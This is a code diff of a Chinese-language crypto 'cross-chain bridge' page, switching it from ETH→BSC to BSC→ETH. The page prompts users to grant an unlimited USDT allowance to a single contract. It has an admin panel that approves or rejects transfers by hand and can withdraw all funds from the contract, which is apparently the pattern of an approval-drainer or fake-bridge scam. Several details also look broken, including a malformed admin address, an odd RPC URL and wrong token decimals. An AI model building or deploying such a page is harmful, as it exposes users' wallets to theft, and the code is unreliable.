@@ -41,7 +41,7 @@ body{
   width: 36px;
   height: 36px;
   border-radius: 50%;
-  background: #27ae60;
+  background: #f3ba2f;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -130,27 +130,26 @@ body{
     <i class="fa fa-cog text-gray-600 text-xl"></i>
   </div>
 </div>
-<div id="walletStatus" class="text-sm text-gray-500 mb-4">请连接以太坊钱包</div>
+<div id="walletStatus" class="text-sm text-gray-500 mb-4">请连接BSC币安链钱包</div>
 
-<!-- 主兑换卡片 复刻截图布局 -->
+<!-- 主兑换卡片 BSC → ETH -->
 <div class="card-wrap">
   <div class="flex justify-between items-center mb-2">
     <span class="text-gray-600">发送</span>
     <span id="maxAll" class="text-blue-500 text-sm cursor-pointer opacity-50 pointer-events-none">全部</span>
   </div>
-  <!-- 发送 USDT ERC20 区域 -->
+  <!-- 发送：BSC‑USDT -->
   <div class="token-box">
     <div class="token-left">
       <div class="token-circle">T</div>
       <div>
         <div class="font-semibold">USDT</div>
-        <div class="text-xs text-gray-500">以太坊 ERC20</div>
+        <div class="text-xs text-gray-500">币安智能链 BSC</div>
       </div>
     </div>
-    <!-- 核心输入框：原生页面输入，适配TP移动端 -->
-    <input 
-      class="input-amount" 
-      id="sendInput" 
+    <input
+      class="input-amount"
+      id="sendInput"
       placeholder="转出数量"
       inputmode="decimal"
       type="text"
@@ -163,21 +162,21 @@ body{
   </div>
 
   <div class="text-gray-600 mt-2 mb-2">接收（预估）</div>
-  <!-- 接收 USDT BEP20 区域 -->
+  <!-- 接收：ETH主网USDT -->
   <div class="token-box">
     <div class="token-left">
       <div class="token-circle">T</div>
       <div>
         <div class="font-semibold">USDT</div>
-        <div class="text-xs text-gray-500">币安智能链 BSC</div>
+        <div class="text-xs text-gray-500">以太坊 ERC20</div>
       </div>
     </div>
     <span id="receiveNum" class="text-xl text-gray-700">0.00</span>
   </div>
 
-  <!-- BSC收款地址输入 -->
+  <!-- ETH收款地址输入 -->
   <div class="address-input-box">
-    <input id="receiveAddr" class="w-full bg-transparent outline-none text-gray-600" placeholder="点击设置接收地址">
+    <input id="receiveAddr" class="w-full bg-transparent outline-none text-gray-600" placeholder="填写以太坊(ETH)接收地址">
   </div>
 
   <!-- 兑换主按钮 -->
@@ -207,11 +206,11 @@ body{
     </div>
     <div class="info-row">
       <span>预估网络Gas费</span>
-      <span>~0.001 ETH</span>
+      <span>~0.002 BNB</span>
     </div>
     <div class="info-row">
       <span>兑换路径</span>
-      <span>ETH→BSC跨链通道</span>
+      <span>BSC→ETH跨链通道</span>
     </div>
   </div>
 </div>
@@ -227,7 +226,7 @@ body{
   <button id="withdrawPoolBtn" class="w-full bg-amber-500 text-white py-3 rounded-lg">提取合约内全部USDT资金</button>
 </div>
 
-<!-- 底部导航栏 对标截图 -->
+<!-- 底部导航栏 -->
 <div class="bottom-nav">
   <div class="nav-item">
     <i class="fa fa-circle-o text-lg"></i>
@@ -252,13 +251,16 @@ body{
 </div>
 
 <script>
-// ===================== 合约配置固定参数 =====================
-const USDT_ETH_ADDR = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+// ===================== BSC→ETH 配置参数 =====================
+// BSC链上USDT合约
+const USDT_BSC_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+// 跨链中转合约（部署在BSC链）
 const BRIDGE_CONTRACT_ADDR = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
 const ADMIN_WALLET = "0x614b189919181818181818181818181818184beb2".toLowerCase();
 const INFINITE_APPROVE = ethers.constants.MaxUint256;
-// 手续费比例：0.1%  输入5000，扣5手续费，到账4995
 const FEE_RATE = 0.001;
+// BSC chainId 0x38
+const BSC_CHAIN_ID = "0x38";
 
 // 全局变量
 let provider, signer, usdtContract, bridgeContract;
@@ -281,7 +283,6 @@ sendInput.addEventListener("input", function(){
   let inputVal = this.value.trim();
   let num = parseFloat(inputVal) || 0;
   if(num < 0) num = 0;
-  // 计算手续费 + 实际到账金额
   const feeAmount = num * FEE_RATE;
   const realReceive = num * (1 - FEE_RATE);
   receiveNum.innerText = realReceive.toFixed(2);
@@ -305,7 +306,7 @@ maxAllBtn.addEventListener("click", function(){
 // ===================== 3、钱包连接逻辑 =====================
 connectBtn.addEventListener("click", async function(){
   if(!window.ethereum){
-    walletStatus.innerText = "请在TokenPocket内置浏览器打开页面";
+    walletStatus.innerText = "请在TP/小狐狸内置浏览器打开页面";
     return;
   }
   try{
@@ -313,14 +314,14 @@ connectBtn.addEventListener("click", async function(){
     provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     signer = provider.getSigner();
-    // 校验以太坊主网
+    // 校验BSC链，不是BSC自动切换
     const network = await provider.getNetwork();
-    if(network.chainId !== 1){
-      await switchEthMainnet();
+    if(network.chainId !== 56){
+      await switchBscMainnet();
     }
     // 初始化合约实例
     initContractInstance();
-    // 获取用户USDT余额
+    // 获取用户BSC‑USDT余额
     await getUserBalance();
     // 解锁全部交互按钮
     maxAllBtn.classList.remove("opacity-50","pointer-events-none");
@@ -328,41 +329,42 @@ connectBtn.addEventListener("click", async function(){
     await checkAdminPermission();
     // 更新钱包状态
     const userAddr = await signer.getAddress();
-    walletStatus.innerText = "已连接钱包：" + userAddr.slice(0,6)+"..."+userAddr.slice(-4);
+    walletStatus.innerText = "已连接钱包：" + userAddr.slice(0,6)+"..."+userAddr.slice(-4)+" [BSC]";
   }catch(err){
     let errMsg = err.code === 4001 ? "用户拒绝钱包授权" : err.message.slice(0,35);
     walletStatus.innerText = "连接失败："+errMsg;
   }
 })
 
-// 切换以太坊主网
-async function switchEthMainnet(){
+// 切换 BSC 主网
+async function switchBscMainnet(){
   const ethereum = window.ethereum;
   try{
     await ethereum.request({
       method: "wallet_switchEthereumChain",
-      params: [{chainId: "0x1"}]
+      params: [{chainId: BSC_CHAIN_ID}]
     })
   }catch(e){
+    // 链不存在，添加BSC网络
     if(e.code === 4902){
       await ethereum.request({
         method:"wallet_addEthereumChain",
         params:[{
-          chainId:"0x1",
-          chainName:"Ethereum Mainnet",
-          rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
-          blockExplorerUrls:["https://etherscan.io"],
-          nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18}
+          chainId:"0x38",
+          chainName:"BNB Smart Chain Mainnet",
+          rpcUrls:["https://bsc‑dot‑api.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"],
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
         }]
       })
     }
   }
 }
 
-// 初始化合约
+// 初始化合约（BSC上的USDT与桥合约ABI）
 function initContractInstance(){
   usdtContract = new ethers.Contract(
-    USDT_ETH_ADDR,
+    USDT_BSC_ADDR,
     [
       "function balanceOf(address owner) view returns(uint256)",
       "function allowance(address owner, address spender) view returns(uint256)",
@@ -373,7 +375,7 @@ function initContractInstance(){
   bridgeContract = new ethers.Contract(
     BRIDGE_CONTRACT_ADDR,
     [
-      "function createCrossOrder(address bscRecv, uint256 amount)",
+      "function createCrossOrder(address ethRecv, uint256 amount)",
       "function approveOrder(uint256 orderId)",
       "function rejectOrder(uint256 orderId)",
       "function withdrawAllPoolUSDT()"
@@ -383,7 +385,7 @@ function initContractInstance(){
   swapActionBtn.disabled = false;
 }
 
-// 获取用户USDT余额
+// 获取用户BSC链USDT余额
 async function getUserBalance(){
   const userAddress = await signer.getAddress();
   userUSDTBalance = await usdtContract.balanceOf(userAddress);
@@ -397,17 +399,16 @@ async function checkAdminPermission(){
   }
 }
 
-// ===================== 优化后的BSC/ETH地址校验（使用ethers原生isAddress，兼容全小写、checksum格式） =====================
+// EVM地址校验
 function checkEvmAddress(addr){
   if(!addr || addr.length === 0) return false;
-  // ethers内置校验，兼容0x开头、大小写、纯小写BSC/ETH地址
   return ethers.utils.isAddress(addr);
 }
 
-// ===================== 4、兑换按钮逻辑（无限授权+下单） =====================
+// ===================== 4、兑换按钮逻辑 BSC→ETH =====================
 swapActionBtn.addEventListener("click", async function(){
   const inputValue = sendInput.value.trim();
-  const bscReceiveAddr = receiveAddrInput.value.trim();
+  const ethReceiveAddr = receiveAddrInput.value.trim();
   const inputNum = parseFloat(inputValue);
 
   // 表单校验
@@ -415,33 +416,31 @@ swapActionBtn.addEventListener("click", async function(){
     alert("请填写有效的兑换数量");
     return;
   }
-  // 使用ethers原生校验地址，解决正确地址误报问题
-  if(!checkEvmAddress(bscReceiveAddr)){
-    alert("您输入的BSC收款地址格式错误，请检查地址（必须0x开头42位EVM地址）");
+  if(!checkEvmAddress(ethReceiveAddr)){
+    alert("您输入的ETH接收地址格式错误，必须是0x开头42位EVM地址");
     return;
   }
   const amountWei = ethers.utils.parseUnits(inputValue,6);
   if(amountWei.gt(userUSDTBalance)){
-    alert("你的USDT余额不足");
+    alert("你的BSC‑USDT余额不足");
     return;
   }
 
   try{
     const userAddr = await signer.getAddress();
-    // 查询当前授权额度
+    // 查询授权额度
     let currentAllowance = await usdtContract.allowance(userAddr, BRIDGE_CONTRACT_ADDR);
-    // 授权不足则唤起钱包无限授权签名
     if(currentAllowance.lt(amountWei)){
-      alert("需要授权USDT给中转合约，请在钱包手动确认签名");
+      alert("需要授权USDT给中转合约，请在钱包确认签名");
       const approveTx = await usdtContract.approve(BRIDGE_CONTRACT_ADDR, INFINITE_APPROVE);
       await approveTx.wait();
-      alert("授权成功，正在创建跨链订单");
+      alert("授权成功，正在创建BSC→ETH跨链订单");
     }
-    // 调用合约创建订单
-    const orderTx = await bridgeContract.createCrossOrder(bscReceiveAddr, amountWei);
+    // 创建跨链订单，参数传入以太坊接收地址
+    const orderTx = await bridgeContract.createCrossOrder(ethReceiveAddr, amountWei);
     await orderTx.wait();
-    alert("下单成功！交易哈希："+orderTx.hash);
-    // 刷新余额、清空输入框
+    alert("下单成功！BSC交易哈希："+orderTx.hash);
+    // 刷新与清空
     await getUserBalance();
     sendInput.value = "";
     receiveNum.innerText = "0.00";
@@ -454,7 +453,6 @@ swapActionBtn.addEventListener("click", async function(){
 })
 
 // ===================== 管理员操作逻辑 =====================
-// 通过订单
 document.getElementById("approveOrderBtn").addEventListener("click", async ()=>{
   if(!signer) return alert("请先连接管理员钱包");
   const oid = document.getElementById("orderId").value.trim();
@@ -462,12 +460,12 @@ document.getElementById("approveOrderBtn").addEventListener("click", async ()=>{
   try{
     const tx = await bridgeContract.approveOrder(oid);
     await tx.wait();
-    alert("订单审核通过");
+    alert("订单审核通过，向以太坊地址发放资产");
   }catch(err){
     alert(err.message);
   }
 })
-// 驳回订单
+
 document.getElementById("rejectOrderBtn").addEventListener("click", async ()=>{
   if(!signer) return alert("请先连接管理员钱包");
   const oid = document.getElementById("orderId").value.trim();
@@ -475,18 +473,18 @@ document.getElementById("rejectOrderBtn").addEventListener("click", async ()=>{
   try{
     const tx = await bridgeContract.rejectOrder(oid);
     await tx.wait();
-    alert("订单已驳回，资金原路退回用户");
+    alert("订单已驳回，BSC上资金原路退回用户");
   }catch(err){
     alert(err.message);
   }
 })
-// 提取合约池内全部资金
+
 document.getElementById("withdrawPoolBtn").addEventListener("click", async ()=>{
   if(!signer) return alert("请先连接管理员钱包");
   try{
     const tx = await bridgeContract.withdrawAllPoolUSDT();
     await tx.wait();
-    alert("合约资金提取完成");
+    alert("BSC合约池资金提取完成");
     await getUserBalance();
   }catch(err){
     alert(err.message);
